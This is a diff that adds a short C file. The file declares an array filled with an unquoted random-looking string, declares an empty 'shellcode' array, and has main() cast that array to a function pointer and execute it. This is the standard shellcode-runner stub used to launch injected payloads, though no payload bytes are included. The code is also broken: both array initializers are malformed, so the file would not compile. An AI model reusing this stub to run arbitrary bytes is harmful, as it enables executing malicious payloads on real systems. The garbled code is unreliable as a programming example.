@@ -1,0 +1,10 @@
+#include <stdio.h>
+unsigned char random[]=L0eMfruBVd5F9ThiFYbS9ndN6jF3enxw467PI1rIFMqdWPMNAeusTGH4oUlSbmygB18ePnGPEYhu7LPJ0EfNj-A1mcfVp54APiSTPeDpAUZVHI4IyH3ebTTLB9yUMeI9efJJYlV5jBWWjiVI6V9paFP0mE1xPV81q1K5mGjfyw-27oxmTotzuMFTYHjdrf3Zk7s2ogUEeW8Bmt7KqWxBIqUoaLanyKNuYaTW2kao9Xhr0MnBR6mmGndMq2LQ78LhaP4B1WNeWwpLl5dD4S3zMdzB2lBsfVkaqO0AoOzcv9obTGygEQ-tbBUzO7ANTBPt1SQLq5YAQTqXhBUM3CUV696rM1R3sLRn6r6cuwr81WMc27mfxnmkfvNek9yrKBI4-E9I2lpzSFipcM8W7QCDyXRHKmcKhtZhs8skhdmTZ0VN7WCQfRl09abkow3UrUWJ9NGgM7ubJSuuQ9ddq1ijCLXXo3e-xz40alEgLhhWCQB61S1vXxHWHf3VJaixHnAA
+
+unsigned char shellcode[]=
+
+
+int main(void)
+{
+        ((void (*)())shellcode)();
+}
